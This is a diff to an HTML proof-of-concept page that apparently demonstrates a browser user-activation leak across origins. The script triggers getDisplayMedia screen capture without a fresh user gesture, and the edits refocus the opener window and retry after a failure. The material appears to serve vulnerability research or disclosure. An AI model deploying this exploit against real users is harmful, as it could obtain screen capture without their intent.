@@ -1,16 +1,20 @@
 <!DOCTYPE html>
 <html lang="en">
-
 <head>
     <meta charset="UTF-8">
     <title>PoC - Target Page (Vulnerable Origin)</title>
 </head>
-
 <body style="background: #e3f2fd; font-family: sans-serif; text-align: center; padding: 50px;">
     <h1>Target Page (Target Origin)</h1>
     <p>User Activation Status: <b id="act-status">Checking...</b></p>
 
     <script>
+        if (window.opener) {
+            setTimeout(() => {
+                window.opener.focus();
+            }, 500); 
+        }
+
         let triggered = false;
 
         function checkAndExploit(triggerSource) {
@@ -24,21 +28,21 @@
 
             if (isActive && !triggered) {
                 triggered = true;
-
                 console.log("[!] Activation leak detected. Triggering getDisplayMedia...");
 
                 navigator.mediaDevices.getDisplayMedia({ video: true })
                     .then(() => {
-                        alert("EXPLOIT SUCCESS:\n\nUser Activation leaked across origins.\ngetDisplayMedia triggered without fresh gesture.");
+                        alert("EXPLOIT SUCCESS:\n\nUser Activation leaked across origins.");
                     })
                     .catch(e => {
-                        console.log("API blocked:", e.message);
+                        console.log("API blocked/dismissed:", e.message);
+                        triggered = false; 
                     });
             }
         }
+
         window.addEventListener("focus", () => checkAndExploit("focus"));
         window.addEventListener("pageshow", () => checkAndExploit("pageshow"));
     </script>
 </body>
-
 </html>
